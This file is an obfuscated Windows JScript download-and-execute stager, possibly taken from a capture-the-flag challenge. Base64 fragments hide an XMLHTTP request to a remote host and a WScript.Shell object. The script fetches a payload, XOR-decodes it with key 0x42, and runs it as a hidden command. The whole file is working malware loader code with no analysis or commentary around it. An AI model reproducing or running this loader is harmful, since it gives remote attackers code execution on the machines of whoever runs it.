(function () {
    function _0xc1e5d1(_0x3f15e1) {
      var _0x4ed775 = '';
      for (var _0xf35ea5 = 0x0; _0xf35ea5 < _0x3f15e1.length; _0xf35ea5++) {
        _0x4ed775 += _0x3f15e1[_0xf35ea5];
      }
      return _0x4ed775;
    }
    function _0x377f01(_0x297534, _0x16c885) {
      var _0x5abc45 = '';
      for (var _0x581cac = 0x0; _0x581cac < _0x297534.length; _0x581cac++) {
        _0x5abc45 += String.fromCharCode(_0x297534.charCodeAt(_0x581cac) ^ _0x16c885);
      }
      return _0x5abc45;
    }
    var _0x42f735 = atob('TVNYTDIuWE1MSFhM');
    var _0x871fec = new ActiveXObject(_0x42f735);
    var _0xc3fb0e = ["aHR0cHM6Ly9tY3Rm", "LmxhbWFyci5iemgv", 'Q0ZjR0ZDR2du'];
    var _0x25f746 = _0xc1e5d1(_0xc3fb0e);
    var _0x16b3fc = atob(_0x25f746);
    _0x871fec.open("GET", _0x16b3fc, false);
    _0x871fec.send();
    if (_0x871fec.status == 0xc8) {
      var _0x462594 = _0x871fec.responseText;
      var _0x32ebbf = _0x377f01(_0x462594, 0x42);
      var _0x439677 = ["W1N", "V1NjcmlwdC5TaGVsbAo="];
      var _0x66a026 = atob(_0x439677[0x1]);
      new ActiveXObject(_0x66a026).Run(_0x32ebbf, 0x0, true);
    } else {
      throw new Error(_0x871fec.status);
    }
  })();